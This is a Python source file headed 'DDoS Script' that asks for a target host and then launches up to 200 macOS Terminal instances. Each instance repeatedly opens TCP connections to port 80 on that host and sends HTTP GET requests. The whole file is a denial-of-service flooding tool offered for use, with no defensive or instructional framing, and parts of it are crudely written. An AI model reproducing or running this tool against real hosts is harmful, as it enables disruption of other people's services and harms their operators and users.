#!/usr/bin/env python
#---------------------------#
# DDoS Script
#---------------------------#

#imports
import os
import sys
import time
import socket

master = 'true'
exe = 'false'
afterSettingsLoop = 'y'


if len(sys.argv) == 3:
	master = 'false'
	exe = 'true'


if master == 'true':
	os.system('clear')
	print('++++++++++++++++++++++SERVER ATTACK++++++++++++++++++++++++')
	print('+++++++++++++++++(c)2013 Christian Gaertner+++++++++++++++++')
	print('')
		#get user input
	#get current script path
	path = input('Please drag this file on this terminal-window and press <enter>!\n>>> ')

	#instances
	instances_str = input('How many instances do you want to open [1-200]?\nINFO:\nIf you enter a non valid number the default of 1 will be chosen!\n>>> ')

	try:
		instances = int(instances_str)
	except ValueError:
		instances = 1

	#times
	times_str = input('How often should be the host attacked by the script [1-1000000]?\nINFO:\If you enter a non valid number the default of 1000 will be chosen!\n>>> ')
	#print ('times: ' + times_str)

	try:
		times = int(times_str)
	except ValueError:
		times = 1000


	#host
	host = input('Which host do you want to attack?\n>>> ')
	#print ('Host: ' + host)



	print('++++++++++++++++++++++SETTINGS++++++++++++++++++++++++')
	print('Instances: ' + str(instances))
	print('Attacks: ' + str(times))
	print('Host: ' + host)
	print('++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
	while afterSettingsLoop == 'y':
		moveOn = input('Do you want to start the attack with the settings above? [y/n]\nINFO:\nTo cancle the attack before completion press <ctrl> and <C>\n>>> ')

		if moveOn == 'n':
			print('Attack abbording...')
			time.sleep(1)
			print('...')
			time.sleep(1)
			print('Attack canceled!')
			time.sleep(2)
			os.system('clear')
			sys.exit()
		elif moveOn == 'y':
			cmd = 'python {0} {1} {2}'.format(path, times, host)
			command = "osascript -e 'tell application \"Terminal\" to do script \"{0}\"'".format(cmd)
			for x in range(0,instances):
				os.system(command)
			afterSettingsLoop = 'n'
			sys.exit()
		else:
			os.system('clear')
			print('Answer either with \"y\" or \"n\" (WITHOUT \" \")!\n')
			time.sleep(5)
			os.system('clear')


if exe == 'true':

	#convert arg to variable
	times = int(sys.argv[1])
	host = sys.argv[2]

	def attack():  
		#pid = os.fork()  
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
		s.connect((host, 80))  
		print (">> GET /" + host + " HTTP/1.1") 
		s.send("GET /" + host + " HTTP/1.1\r\n")  
		s.send("Host: " + host  + "\r\n\r\n");  
		s.close()

	os.system('clear')
	print('][....ATTACKING....')
	print('][....HOST:{0}'.format(host))
	print('][....Starting in 5sec...')
	time.sleep(5)
	print('][...STARTED...][')
	#execute the DDOS
	for x in range(0, times):  
		attack()
